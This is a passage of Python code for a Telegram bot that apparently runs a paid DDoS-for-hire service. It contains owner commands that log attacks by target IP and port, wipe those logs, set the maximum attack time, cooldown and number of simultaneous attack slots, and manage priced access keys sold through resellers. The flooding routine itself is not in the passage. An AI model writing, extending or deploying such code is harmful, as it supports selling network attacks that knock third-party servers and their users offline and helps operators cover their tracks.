    ram = psutil.virtual_memory()
    ram_used = ram.used / 1024 / 1024
    ram_total = ram.total / 1024 / 1024
    ram_percent = ram.percent
    
    disk = psutil.disk_usage('/')
    disk_percent = disk.percent
    
    import platform
    system_info = f"{platform.system()} {platform.release()}"
    
    total_users = users_collection.count_documents({})
    active_users = users_collection.count_documents({'key_expiry': {'$gt': datetime.now()}})
    
    online_threshold = datetime.now() - timedelta(minutes=5)
    online_users = bot_users_collection.count_documents({'last_seen': {'$gt': online_threshold}})
    
    total_resellers = resellers_collection.count_documents({})
    active_keys = keys_collection.count_documents({'used': False})
    total_keys = keys_collection.count_documents({})
    
    busy_slots, free_slots, total_slots = get_slot_status()
    active_count = len([a for a in active_attacks.values() if a['end_time'] > datetime.now()])
    
    maint_status = f"{pe('cross','🔴')} Eɴᴀʙʟᴇᴅ" if is_maintenance() else f"{pe('check','✅')} Dɪꜱᴀʙʟᴇᴅ"
    
    response = "═══════════════════════════\n"
    response += f"{pe('chart','📊')} Sᴇʀᴠᴇʀ Sᴛᴀᴛɪꜱᴛɪᴄꜱ\n"
    response += "═══════════════════════════\n\n"
    
    response += f"{pe('gear','🤖')} Bᴏᴛ Iɴꜰᴏʀᴍᴀᴛɪᴏɴ\n"
    response += f"★ Uᴘᴛɪᴍᴇ: {uptime_str}\n"
    response += f"★ Mᴇᴍᴏʀʏ Usᴀɢᴇ: {memory_mb:.1f} MB\n"
    response += f"★ CPU Usᴀɢᴇ: {cpu_percent:.1f}%\n"
    response += f"★ Tʜʀᴇᴀᴅꜱ: {threads}\n\n"
    
    response += f"{pe('desktop_anim','💻')} Sʏꜱᴛᴇᴍ Iɴꜰᴏʀᴍᴀᴛɪᴏɴ\n"
    response += f"★ Sʏꜱᴛᴇᴍ: {system_info}\n"
    response += f"★ CPU: {cpu_overall:.1f}% ᴏᴠᴇʀᴀʟʟ\n"
    response += f"★ RAM: {ram_percent:.1f}% ᴜꜱᴇᴅ ({ram_used:.0f}MB/{ram_total:.0f}MB)\n"
    response += f"★ Dɪꜱᴋ: {disk_percent:.1f}% ᴜꜱᴇᴅ\n\n"
    
    response += f"★ Aᴄᴛɪᴠᴇ Aᴛᴛᴀᴄᴋꜱ: {active_count}/{total_slots}\n"
    response += f"★ Mᴀɪɴᴛᴇɴᴀɴᴄᴇ Mᴏᴅᴇ: {maint_status}\n\n"
    
    response += f"{pe('chart_up','📈')} Bᴏᴛ Dᴀᴛᴀ\n"
    response += f"★ Tᴏᴛᴀʟ Usᴇʀꜱ: {total_users}\n"
    response += f"★ Aᴄᴛɪᴠᴇ Usᴇʀꜱ (Kᴇʏꜱ): {active_users}\n"
    response += f"★ Oɴʟɪɴᴇ Usᴇʀꜱ: {online_users}\n"
    response += f"★ Rᴇꜱᴇʟʟᴇʀꜱ: {total_resellers}\n"
    response += f"★ Aᴠᴀɪʟᴀʙʟᴇ Kᴇʏꜱ: {active_keys}\n"
    response += f"★ Tᴏᴛᴀʟ Kᴇʏꜱ: {total_keys}\n"
    response += f"★ Bʟᴏᴄᴋᴇᴅ IPꜱ: {len(get_all_blocked_ips())}\n"
    response += f"★ Aᴘᴘʀᴏᴠᴇᴅ Gʀᴏᴜᴘꜱ: {approved_groups_collection.count_documents({})}\n"
    
    response += "\n═══════════════════════════"
    
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["logs"])
def attack_logs_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", reply_to=message, parse_mode="HTML")
        return
    
    all_logs = list(attack_logs_collection.find().sort('timestamp', -1).limit(100))
    
    if not all_logs:
        safe_send_message(message.chat.id, f"{pe('chart','📋')} Nᴏ ᴀᴛᴛᴀᴄᴋ ʟᴏɢꜱ ꜰᴏᴜɴᴅ!", reply_to=message, parse_mode="HTML")
        return
    
    response = "════════════════════════════════════════\n"
    response += f"              {pe('chart','📊')} ATTACK LOGS\n"
    response += f"         Generated: {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}\n"
    response += f"         Total Attacks: {len(all_logs)}\n"
    response += "════════════════════════════════════════\n\n"
    
    for i, log in enumerate(all_logs, 1):
        response += f"{i}. {pe('profile','👤')} {log.get('username', 'Unknown')}\n"
        response += f"   {pe('profile','🆔')} ID: {log.get('user_id', 'N/A')}\n"
        response += f"   {pe('target','🎯')} Tᴀʀɢᴇᴛ: {log.get('target', 'N/A')}:{log.get('port', 'N/A')}\n"
        response += f"   {pe('timer','⏱️')} Dᴜʀᴀᴛɪᴏɴ: {log.get('duration', 'N/A')}ꜱ\n"
        if log.get('timestamp'):
            response += f"   {pe('timer','🕐')} Tɪᴍᴇ: {log['timestamp'].strftime('%d-%m-%Y %H:%M:%S')}\n"
        response += "   ────────────────────────────────────────\n"
    
    response += "\n════════════════════════════════════════"
    
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["dellogs"])
def delete_logs_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", reply_to=message, parse_mode="HTML")
        return
    
    count = attack_logs_collection.count_documents({})
    
    if count == 0:
        safe_send_message(message.chat.id, f"{pe('chart','📋')} Nᴏ ʟᴏɢꜱ ᴛᴏ ᴅᴇʟᴇᴛᴇ!", reply_to=message, parse_mode="HTML")
        return
    
    attack_logs_collection.delete_many({})
    
    safe_send_message(message.chat.id, f"{pe('check','✅')} {count} ᴀᴛᴛᴀᴄᴋ ʟᴏɢꜱ ᴅᴇʟᴇᴛᴇᴅ!", reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["maxattack"])
def max_attack_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", reply_to=message, parse_mode="HTML")
        return
    
    command_parts = message.text.split()
    
    if len(command_parts) == 1:
        current = get_max_attack_time()
        safe_send_message(message.chat.id, f"{pe('gear','⚙️')} Cᴜʀʀᴇɴᴛ Mᴀx Aᴛᴛᴀᴄᴋ Tɪᴍᴇ: {current}ꜱ\n\nCʜᴀɴɢᴇ: /maxattack <ꜱᴇᴄᴏɴᴅꜱ>", reply_to=message, parse_mode="HTML")
        return
    
    try:
        new_value = int(command_parts[1])
        if new_value < MIN_ATTACK_TIME:
            safe_send_message(message.chat.id, f"{pe('cross','❌')} Vᴀʟᴜᴇ ᴍᴜꜱᴛ ʙᴇ ᴀᴛ ʟᴇᴀꜱᴛ {MIN_ATTACK_TIME} ꜱᴇᴄᴏɴᴅꜱ!", reply_to=message, parse_mode="HTML")
            return
        
        set_setting('max_attack_time', new_value)
        safe_send_message(message.chat.id, f"{pe('check','✅')} Mᴀx Aᴛᴛᴀᴄᴋ Tɪᴍᴇ ꜱᴇᴛ: {new_value}ꜱ", reply_to=message, parse_mode="HTML")
    except ValueError:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Iɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ!", reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["cooldown"])
def cooldown_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", reply_to=message, parse_mode="HTML")
        return
    
    command_parts = message.text.split()
    
    if len(command_parts) == 1:
        current = get_user_cooldown_setting()
        safe_send_message(message.chat.id, f"{pe('hourglass','⏳')} Cᴜʀʀᴇɴᴛ Cᴏᴏʟᴅᴏᴡɴ: {current}ꜱ\n\nCʜᴀɴɢᴇ: /cooldown <ꜱᴇᴄᴏɴᴅꜱ>", reply_to=message, parse_mode="HTML")
        return
    
    try:
        new_value = int(command_parts[1])
        if new_value < 0:
            safe_send_message(message.chat.id, f"{pe('cross','❌')} Cᴏᴏʟᴅᴏᴡɴ ᴄᴀɴɴᴏᴛ ʙᴇ ɴᴇɢᴀᴛɪᴠᴇ!", reply_to=message, parse_mode="HTML")
            return
        
        set_setting('user_cooldown', new_value)
        safe_send_message(message.chat.id, f"{pe('check','✅')} Cᴏᴏʟᴅᴏᴡɴ ꜱᴇᴛ: {new_value}ꜱ", reply_to=message, parse_mode="HTML")
    except ValueError:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Iɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ!", reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["setmaxslot"])
def set_max_slot_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", parse_mode="HTML")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, f"{pe('warning','⚠️')} Usᴀɢᴇ: /setmaxslot <ꜱʟᴏᴛꜱ>\n\nExᴀᴍᴘʟᴇ: /setmaxslot 4\n\nTʜɪꜱ ꜱᴇᴛꜱ ʜᴏᴡ ᴍᴀɴʏ ᴀᴛᴛᴀᴄᴋꜱ ᴄᴀɴ ʀᴜɴ ꜱɪᴍᴜʟᴛᴀɴᴇᴏᴜꜱʟʏ.", parse_mode="HTML")
        return
    
    try:
        global current_max_slots
        new_slots = int(command_parts[1])
        
        if new_slots < 1:
            new_slots = 1
        if new_slots > 50:
            new_slots = 50
        
        current_max_slots = new_slots
        set_setting('max_concurrent_slots', new_slots)
        
        bot.reply_to(message, f"{pe('check','✅')} Mᴀx ꜱɪᴍᴜʟᴛᴀɴᴇᴏᴜꜱ ᴀᴛᴛᴀᴄᴋ ꜱʟᴏᴛꜱ ꜱᴇᴛ ᴛᴏ: {new_slots}\n\nNᴏᴡ {new_slots} ᴀᴛᴛᴀᴄᴋꜱ ᴄᴀɴ ʀᴜɴ ᴀᴛ ᴛʜᴇ ꜱᴀᴍᴇ ᴛɪᴍᴇ.", parse_mode="HTML")
    except:
        bot.reply_to(message, f"{pe('cross','❌')} Iɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ! Usᴇ: /setmaxslot <ꜱʟᴏᴛꜱ>", parse_mode="HTML")

@bot.message_handler(commands=["maintenance"])
def maintenance_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", reply_to=message, parse_mode="HTML")
        return
    
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        safe_send_message(message.chat.id, f"{pe('warning','⚠️')} Usᴀɢᴇ: /maintenance <ᴍᴇꜱꜱᴀɢᴇ>\n\nExᴀᴍᴘʟᴇ: /maintenance Bᴏᴛ ɪꜱ ᴜᴘᴅᴀᴛɪɴɢ, ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ 10 ᴍɪɴᴜᴛᴇꜱ", reply_to=message, parse_mode="HTML")
        return
    
    msg = command_parts[1]
    set_maintenance(True, msg)
    safe_send_message(message.chat.id, f"{pe('gear','🔧')} Mᴀɪɴᴛᴇɴᴀɴᴄᴇ Mᴏᴅᴇ ON!\n\nMᴇꜱꜱᴀɢᴇ: {msg}\n\nUsᴇ /ok ᴛᴏ ᴛᴜʀɴ ᴏꜰꜰ", reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["ok"])
def ok_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", reply_to=message, parse_mode="HTML")
        return
    
    if not is_maintenance():
        safe_send_message(message.chat.id, f"{pe('info','ℹ️')} Mᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ ɪꜱ ᴀʟʀᴇᴀᴅʏ OFF!", reply_to=message, parse_mode="HTML")
        return
    
    set_maintenance(False)
    safe_send_message(message.chat.id, f"{pe('check','✅')} Mᴀɪɴᴛᴇɴᴀɴᴄᴇ Mᴏᴅᴇ OFF!\n\nBᴏᴛ ɪꜱ ɴᴏᴡ ɴᴏʀᴍᴀʟ.", reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["extend"])
def extend_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", reply_to=message, parse_mode="HTML")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, f"{pe('warning','⚠️')} Usᴀɢᴇ: /extend <ɪᴅ ᴏʀ @ᴜꜱᴇʀɴᴀᴍᴇ> <ᴛɪᴍᴇ>", reply_to=message, parse_mode="HTML")
        return
    
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Usᴇʀ ɴᴏᴛ ꜰᴏᴜɴᴅ!", reply_to=message, parse_mode="HTML")
        return
    
    duration_str = command_parts[2].lower()
    duration, duration_label = parse_duration(duration_str)
    
    if not duration:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Iɴᴠᴀʟɪᴅ ᴅᴜʀᴀᴛɪᴏɴ!", reply_to=message, parse_mode="HTML")
        return
    
    user = users_collection.find_one({'user_id': target_user_id})
    
    if not user:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Usᴇʀ ɴᴏᴛ ꜰᴏᴜɴᴅ ɪɴ ᴋᴇʏ ᴅᴀᴛᴀʙᴀꜱᴇ!", reply_to=message, parse_mode="HTML")
        return
    
    if user.get('key_expiry') and user['key_expiry'] > datetime.now():
        new_expiry = user['key_expiry'] + duration
    else:
        new_expiry = datetime.now() + duration
    
    users_collection.update_one(
        {'user_id': target_user_id},
        {'$set': {'key_expiry': new_expiry}}
    )
    
    new_remaining = format_timedelta(new_expiry - datetime.now())
    
    try:
        bot.send_message(target_user_id, f"{pe('congrats','🎉')} Tɪᴍᴇ Exᴛᴇɴᴅᴇᴅ!\n\n{pe('timer','⏰')} Aᴅᴅᴇᴅ: {duration_label}\n{pe('hourglass','⏳')} Tᴏᴛᴀʟ Tɪᴍᴇ: {new_remaining}\n\nEɴᴊᴏʏ!", parse_mode="HTML")
    except:
        pass
    
    display = f"@{resolved_name}" if resolved_name else str(target_user_id)
    safe_send_message(message.chat.id, f"{pe('check','✅')} Tɪᴍᴇ Exᴛᴇɴᴅᴇᴅ!\n\n{pe('profile','👤')} Usᴇʀ: {display}\n{pe('profile','🆔')} ID: {target_user_id}\n{pe('timer','⏰')} Aᴅᴅᴇᴅ: {duration_label}\n{pe('hourglass','⏳')} Nᴇᴡ Tɪᴍᴇ: {new_remaining}", reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["extendall"])
def extend_all_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", reply_to=message, parse_mode="HTML")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{pe('warning','⚠️')} Usᴀɢᴇ: /extendall <ᴛɪᴍᴇ>", reply_to=message, parse_mode="HTML")
        return
    
    duration_str = command_parts[1].lower()
    duration, duration_label = parse_duration(duration_str)
    
    if not duration:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Iɴᴠᴀʟɪᴅ ᴅᴜʀᴀᴛɪᴏɴ!", reply_to=message, parse_mode="HTML")
        return
    
    all_users = list(users_collection.find({'key': {'$ne': None}}))
    
    if not all_users:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Nᴏ ᴜꜱᴇʀꜱ ᴡɪᴛʜ ᴋᴇʏꜱ ꜰᴏᴜɴᴅ!", reply_to=message, parse_mode="HTML")
        return
    
    extended_count = 0
    notified_count = 0
    
    for user in all_users:
        uid = user['user_id']
        old_expiry = user.get('key_expiry')
        
        if old_expiry and old_expiry > datetime.now():
            new_expiry = old_expiry + duration
        else:
            new_expiry = datetime.now() + duration
            
        users_collection.update_one(
            {'user_id': uid},
            {'$set': {'key_expiry': new_expiry}}
        )
        extended_count += 1
        
        try:
            bot.send_message(uid, f"{pe('congrats','🎉')} Tɪᴍᴇ Exᴛᴇɴᴅᴇᴅ ꜰᴏʀ Aʟʟ Usᴇʀꜱ!\n\n{pe('timer','⏰')} Aᴅᴅᴇᴅ: {duration_label}\n\nEɴᴊᴏʏ!", parse_mode="HTML")
            notified_count += 1
        except:
            pass
            
    safe_send_message(message.chat.id, f"{pe('check','✅')} Dᴏɴᴇ! Eᴠᴇʀʏᴏɴᴇ'ꜱ ᴛɪᴍᴇ ʜᴀꜱ ʙᴇᴇɴ ᴇxᴛᴇɴᴅᴇᴅ.\n\n{pe('profile','👤')} Tᴏᴛᴀʟ Usᴇʀꜱ: {extended_count}\n{pe('letter','📨')} Nᴏᴛɪꜰɪᴇᴅ: {notified_count}\n{pe('timer','⏰')} Aᴅᴅᴇᴅ: {duration_label}", reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["down"])
def down_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", reply_to=message, parse_mode="HTML")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, f"{pe('warning','⚠️')} Usᴀɢᴇ: /down <ɪᴅ ᴏʀ @ᴜꜱᴇʀɴᴀᴍᴇ> <ᴛɪᴍᴇ>", reply_to=message, parse_mode="HTML")
        return
    
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Usᴇʀ ɴᴏᴛ ꜰᴏᴜɴᴅ!", reply_to=message, parse_mode="HTML")
        return
    
    duration_str = command_parts[2].lower()
    duration, duration_label = parse_duration(duration_str)
    
    if not duration:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Iɴᴠᴀʟɪᴅ ᴅᴜʀᴀᴛɪᴏɴ!", reply_to=message, parse_mode="HTML")
        return
    
    user = users_collection.find_one({'user_id': target_user_id})
    
    if not user:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Usᴇʀ ɴᴏᴛ ꜰᴏᴜɴᴅ ɪɴ ᴋᴇʏ ᴅᴀᴛᴀʙᴀꜱᴇ!", reply_to=message, parse_mode="HTML")
        return
    
    if not user.get('key_expiry') or user['key_expiry'] <= datetime.now():
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Usᴇʀ ᴅᴏᴇꜱ ɴᴏᴛ ʜᴀᴠᴇ ᴀɴ ᴀᴄᴛɪᴠᴇ ᴋᴇʏ!", reply_to=message, parse_mode="HTML")
        return
    
    new_expiry = user['key_expiry'] - duration
    display = f"@{resolved_name}" if resolved_name else str(target_user_id)
    
    if new_expiry <= datetime.now():
        users_collection.update_one(
            {'user_id': target_user_id},
            {'$set': {'key': None, 'key_expiry': None}}
        )
        safe_send_message(message.chat.id, f"{pe('warning','⚠️')} Kᴇʏ Exᴘɪʀᴇᴅ!\n\n{pe('profile','👤')} Usᴇʀ: {display}\n{pe('profile','🆔')} ID: {target_user_id}\n{pe('cross','❌')} Kᴇʏ ʀᴇᴍᴏᴠᴇᴅ!", reply_to=message, parse_mode="HTML")
    else:
        users_collection.update_one(
            {'user_id': target_user_id},
            {'$set': {'key_expiry': new_expiry}}
        )
        new_remaining = format_timedelta(new_expiry - datetime.now())
        safe_send_message(message.chat.id, f"{pe('check','✅')} Tɪᴍᴇ Rᴇᴅᴜᴄᴇᴅ!\n\n{pe('profile','👤')} Usᴇʀ: {display}\n{pe('profile','🆔')} ID: {target_user_id}\n{pe('timer','⏰')} Rᴇᴅᴜᴄᴇᴅ: {duration_label}\n{pe('hourglass','⏳')} Nᴇᴡ Tɪᴍᴇ: {new_remaining}", reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["delkey"])
def delete_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", reply_to=message, parse_mode="HTML")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{pe('warning','⚠️')} Usᴀɢᴇ: /delkey <ᴋᴇʏ>", reply_to=message, parse_mode="HTML")
        return
    
    key_input = command_parts[1]
    
    result = keys_collection.delete_one({'key': key_input})
    
    if result.deleted_count > 0:
        users_collection.update_one({'key': key_input}, {'$set': {'key': None, 'key_expiry': None}})
        safe_send_message(message.chat.id, f"{pe('check','✅')} Kᴇʏ <code>{key_input}</code> ᴅᴇʟᴇᴛᴇᴅ!", reply_to=message, parse_mode="HTML")
    else:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Kᴇʏ ɴᴏᴛ ꜰᴏᴜɴᴅ!", reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["key"])
def key_details_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", reply_to=message, parse_mode="HTML")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{pe('warning','⚠️')} Usᴀɢᴇ: /key <ᴋᴇʏ>", reply_to=message, parse_mode="HTML")
        return
    
    key_input = command_parts[1]
    
    key_doc = keys_collection.find_one({'key': key_input})
    
    if not key_doc:
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Kᴇʏ ɴᴏᴛ ꜰᴏᴜɴᴅ!", reply_to=message, parse_mode="HTML")
        return
    
    response = "═══════════════════════════\n"
    response += f"{pe('lock','🔑')} Kᴇʏ Dᴇᴛᴀɪʟꜱ\n"
    response += "═══════════════════════════\n\n"
    
    response += f"{pe('lock','🔑')} Kᴇʏ: {key_input}\n"
    response += f"{pe('timer','⏰')} Dᴜʀᴀᴛɪᴏɴ: {key_doc.get('duration_label', 'Unknown')}\n"
    response += f"{pe('timer','⏱️')} Sᴇᴄᴏɴᴅꜱ: {key_doc.get('duration_seconds', 0)}\n"
    response += f"{pe('calendar','📅')} Cʀᴇᴀᴛᴇᴅ: {key_doc.get('created_at', 'Unknown')}\n"
    
    creator_type = key_doc.get('created_by_type', 'owner')
    if creator_type == 'reseller':
        creator = key_doc.get('created_by_username', str(key_doc.get('created_by', 'Unknown')))
        response += f"{pe('profile','👤')} Cʀᴇᴀᴛᴏʀ: {creator} (Rᴇꜱᴇʟʟᴇʀ)\n"
    else:
        response += f"{pe('profile','👤')} Cʀᴇᴀᴛᴏʀ: Oᴡɴᴇʀ\n"
    
    response += f"\n{pe('chart','📊')} Sᴛᴀᴛᴜꜱ: {'🔴 Usᴇᴅ' if key_doc.get('used') else '🟢 Uɴᴜꜱᴇᴅ'}\n"
    response += f"{pe('star','⭐')} Tʏᴘᴇ: {key_doc.get('key_type', 'NORMAL')}\n"
    response += f"{pe('lightning','⚡')} Mᴀx Aᴛᴛᴀᴄᴋ: {key_doc.get('max_attack_time', 300)}ꜱ\n"
    
    if key_doc.get('used'):
        response += f"{pe('profile','👤')} Usᴇᴅ Bʏ: {key_doc.get('used_by', 'Unknown')}\n"
        response += f"{pe('calendar','📅')} Usᴇᴅ Aᴛ: {key_doc.get('used_at', 'Unknown')}\n"
        
        user = users_collection.find_one({'key': key_input})
        if user:
            response += f"\n─── Usᴇʀ Iɴꜰᴏ ───\n"
            response += f"{pe('profile','👤')} Usᴇʀɴᴀᴍᴇ: {user.get('username', 'Unknown')}\n"
            response += f"{pe('profile','🆔')} Usᴇʀ ID: {user.get('user_id', 'Unknown')}\n"
            
            expiry = user.get('key_expiry')
            if expiry:
                if expiry > datetime.now():
                    remaining = format_timedelta(expiry - datetime.now())
                    response += f"{pe('hourglass','⏳')} Rᴇᴍᴀɪɴɪɴɢ: {remaining}\n"
                    response += f"{pe('check','✅')} Sᴛᴀᴛᴜꜱ: Aᴄᴛɪᴠᴇ\n"
                else:
                    response += f"{pe('cross','❌')} Sᴛᴀᴛᴜꜱ: Exᴘɪʀᴇᴅ\n"
    
    response += "\n═══════════════════════════"
    
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="HTML")

@bot.message_handler(commands=["allkeys"])
def list_keys_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{pe('cross','❌')} Tʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!", reply_to=message, parse_mode="HTML")
        return
    
    all_keys = list(keys_collection.find().sort('created_at', -1))
    unused_keys = [k for k in all_keys if not k.get('used')]
    used_keys = [k for k in all_keys if k.get('used')]
    
    response = "╔════════════════════════════════════════════════════════════════╗\n"
    response += f"║                       {pe('chart','📋')} ALL KEYS REPORT                      ║\n"
    response += f"║                  Generated: {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}                  ║\n"
    response += "╠════════════════════════════════════════════════════════════════╣\n"
    response += f"║  {pe('chart','📊')} TOTAL KEYS: {len(all_keys)}  |  🟢 UNUSED: {len(unused_keys)}  |  🔴 USED: {len(used_keys)}  ║\n"
    response += "╚════════════════════════════════════════════════════════════════╝\n\n"
    
    if unused_keys:
        response += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        response += f"{pe('check','🟢')} UNUSED KEYS\n"
        response += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        for i, key in enumerate(unused_keys, 1):
            key_type = key.get('key_type', 'NORMAL')
            duration_label = key.get('duration_label', 'N/A')
            price = get_key_price(key_type, duration_label)
            created_by = key.get('created_by_username', 'Owner')
            creator_type = key.get('created_by_type', 'owner')
            response += f"┌────────────────────────────────────────────────────────────────┐\n"
            response += f"│ {i}. {pe('lock','🔑')} KEY: <code>{key['key']}</code>\n"
            response += f"│    {pe('star','⭐')} TYPE: {key_type}\n"
            response += f"│    {pe('timer','⏰')} DURATION: {duration_label}\n"
            response += f"│    {pe('money','💰')} PRICE: {price} Rs\n"
            response += f"│    {pe('profile','👤')} CREATED BY: {created_by}\n"
            response += f"│    {pe('tag','🏷️')} CREATOR TYPE: {creator_type.upper()}\n"
            response += f"│    {pe('calendar','📅')} CREATED: {key.get('created_at', 'N/A')}\n"
            response += f"└────────────────────────────────────────────────────────────────┘\n\n"
            
    if used_keys:
        response += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        response += f"{pe('cross','🔴')} USED KEYS\n"
        response += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        for i, key in enumerate(used_keys, 1):
            key_type = key.get('key_type', 'NORMAL')
            duration_label = key.get('duration_label', 'N/A')
            price = get_key_price(key_type, duration_label)
            created_by = key.get('created_by_username', 'Owner')
            creator_type = key.get('created_by_type', 'owner')
            used_by = key.get('used_by', 'Unknown')
            user = users_collection.find_one({'key': key['key']})
            username = user.get('username', 'Unknown') if user else 'Unknown'
            expiry = user.get('key_expiry') if user else None
            response += f"┌────────────────────────────────────────────────────────────────┐\n"
            response += f"│ {i}. {pe('lock','🔑')} KEY: <code>{key['key']}</code>\n"
            response += f"│    {pe('star','⭐')} TYPE: {key_type}\n"
            response += f"│    {pe('timer','⏰')} DURATION: {duration_label}\n"
